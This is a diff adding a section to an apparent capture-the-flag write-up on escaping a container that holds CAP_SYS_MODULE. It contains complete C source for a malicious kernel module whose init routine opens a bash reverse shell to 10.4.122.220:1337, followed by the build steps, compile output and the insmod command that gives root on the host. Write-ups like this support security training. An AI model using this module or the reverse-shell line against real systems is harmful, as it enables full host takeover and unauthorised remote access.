@@ -322,6 +322,105 @@ From running, the most vital piece of information was the `CAP_SYS_MODULE` under
 
 ---
 
+### Why this matters
+
+- Containers normally **cannot** load kernel modules
+- With `CAP_SYS_MODULE`, the container can insert its own `.ko` module
+- This means code runs in the host kernel context → effectively giving host root
+
+---
+
+### Kernel module source (rev.c)
+
+```c
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kmod.h>
+
+MODULE_LICENSE("GPL");
+
+static int launch_shell(void) {
+    char *argv[] = {
+        "/bin/bash",
+        "-c",
+        "bash -i >& /dev/tcp/10.4.122.220/1337 0>&1",
+        NULL
+    };
+
+    static char *envp[] = {
+        "HOME=/",
+        "TERM=linux",
+        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
+        NULL
+    };
+
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+}
+
+static int __init mod_init(void) {
+    return launch_shell();
+}
+
+static void __exit mod_exit(void) { }
+
+module_init(mod_init);
+module_exit(mod_exit);
+```
+
+---
+
+### Build environment
+
+Prepare a working directory:
+
+```bash
+root@d221f7bc7bf8:/tmp# mkdir -p /tmp/exp
+root@d221f7bc7bf8:/tmp# mv /tmp/rev.c /tmp/makefile /tmp/exp
+root@d221f7bc7bf8:/tmp# cd /tmp/exp
+root@d221f7bc7bf8:/tmp/exp# mv makefile Makefile
+```
+
+Confirm kernel headers:
+
+```bash
+root@d221f7bc7bf8:/tmp/exp# ls -l /lib/modules/6.8.0-1030-aws/build
+lrwxrwxrwx 1 root root 37 May 30 16:04 /lib/modules/6.8.0-1030-aws/build -> /usr/src/linux-headers-6.8.0-1030-aws
+```
+
+---
+
+### Compile the module
+
+```bash
+root@d221f7bc7bf8:/tmp/exp# make KVER=6.8.0-1030-aws
+make -C /lib/modules/6.8.0-1030-aws/build M=/tmp/exp modules
+make[1]: Entering directory '/usr/src/linux-headers-6.8.0-1030-aws'
+warning: the compiler differs from the one used to build the kernel
+  The kernel was built by: x86_64-linux-gnu-gcc-12 (Ubuntu 12.3.0-1ubuntu1~22.04) 12.3.0
+  You are using:           gcc-12 (Ubuntu 12.3.0-1ubuntu1~22.04) 12.3.0
+  CC [M]  /tmp/exp/rev.o
+  MODPOST /tmp/exp/Module.symvers
+  CC [M]  /tmp/exp/rev.mod.o
+  LD [M]  /tmp/exp/rev.ko
+  BTF [M] /tmp/exp/rev.ko
+Skipping BTF generation for /tmp/exp/rev.ko due to unavailability of vmlinux
+make[1]: Leaving directory '/usr/src/linux-headers-6.8.0-1030-aws'
+```
+
+At this point `rev.ko` is compiled.
+
+---
+
+### Load the module
+
+```bash
+root@d221f7bc7bf8:/tmp/exp# insmod rev.ko
+```
+
+This triggers the payload embedded in the module. Since it was configured to launch a reverse shell, the connection spawns back to the attacker machine as root on the host OS.
+
+---
+
 # Root.txt
 
 ![Host root flag](./images/host-root-flag.png)
